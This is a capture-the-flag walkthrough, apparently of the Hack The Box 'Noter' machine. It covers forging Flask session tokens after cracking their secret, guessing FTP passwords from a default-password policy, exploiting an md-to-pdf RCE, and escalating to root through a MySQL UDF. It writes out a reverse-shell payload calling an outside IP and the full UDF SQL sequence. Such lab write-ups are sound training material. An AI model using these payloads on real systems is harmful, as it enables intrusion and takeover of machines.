### Machine Stats :

#### Walkthrough :

I started as always by scanning the machine ports :

<img src="./img/0.png">

* SSH on port 22.

* FTP on 21.

* A webserver on port 5000.


I tried anonymous login on ftp but that didn't work. So i decided to look at the web server on port 5000. It was a flask web app that provides users with a database to store and manage notes.

Trying common logins and passwords (admin:admin, *:*, root:root ...) or trigering an SQL error wasn't fruitful.
So i decided to register a user Tom to be able to further explore the app.

While inspecting the intercepted requests on burp, i found out that a session token (looks like JWT) is used.
I decoded it with jwt.io which revealed an awkward payload and an interesting header.

<img src="./img/4.png">

It wasn't actually a typical jwt which often looked more like this (with a valid signature):

<img src="./img/5.png">

I figured out that it was a flask token thanks to Carlos Polop's HackTricks (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask/).
Using flask_unsign with a rockyou.txt as a wordlist was good enough to reveal the secret.

I'm now able to craft my own tokens using the same tool to bruteforce usernames.
All i needed was a bash script and a good wordlist to generate my tokens:

<img src="./img/7.png">

I used ffuf using my generated tokens as a session value and there was 2 200 HTTP responses (A wrong token redirects to /login).

<img src="./img/8.png">

A username "user" which was useless and another one named "blue" which actually had some stored notes.

One note written by ftp_admin exposed the ftp username and password of blue.

<img src="./img/9.png">

I used these creds to access ftp on port 21. It had an empty directory and a pdf file which exposed the comapany's password policy.
Reading only the title, i thought i only had some additional specifications making password guessing easier, but it actually specified the way default passwords are generated.

<img src="./img/11.png">

I tried to ftp using user:user@Noter! but it failed it made me think that it was just an account created by another HTB player.(i was so desperate that i tried root:root@Noter! too)
But there was a potential username which i didn't used yet, so i decided to give it a shot.
ftp_admin:ftp_admin@Noter! was the one.

<img src="./img/12.png">

i downloaded and decompressed the zip files and now i finally have the app's source code xD.

<img src="./img/13.png">

the app.py file had the database credentials

<img src="./img/14.png">

Through the templates folder, i discovered hidden paths import_note and export_note which looked promising with the "Export directly from cloud" feature.


<img src="./img/15.png">

It's backend code was in md_to_pdf.js. And Google proved again that it's my best friend, revealing an RCE vulnerability:

<img src="./img/16.png">

The only proof of concept i found was a local one :

<img src="./img/17.png">

But in my case i hosted a markdown file (.md) with a reverse shell payload:

``` ---js\n((require("child_process")).execSync("bash -i >& /dev/tcp/10.10.14.43/4444 0>&1"))\n--- ```

I prepared my listener and requested my malicious md file (http://10.10.14.43:80/a.md) from th vulnerable server to trigger the rce but it didn't work, i didn't catch a shell. 

<img src="./img/18.png">

I had this problem before and i thought i had a trick to fix it which was wrapping the revshell in bash -c ''.
It was better but i still didn't get an interactive shell.

<img src="./img/19.png">

Looking again at the public proof of concept i had an idea of seperating the shell and the rce payload.
And successfully got a shell.

Running linpeas revealed an open mysql port and i already have the root creds.
After some searching i found this Privilege Escalation with MySQL User Defined Functions:

<img src="./img/22.png">

I downloaded the library compiled it and made a text file containing the payload to copy the root flag to /tmp and make it readable.

``` 
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /root/root.txt /tmp; chown svc svc /tmp/root.txt;');
 ```

And now i have the root flag.
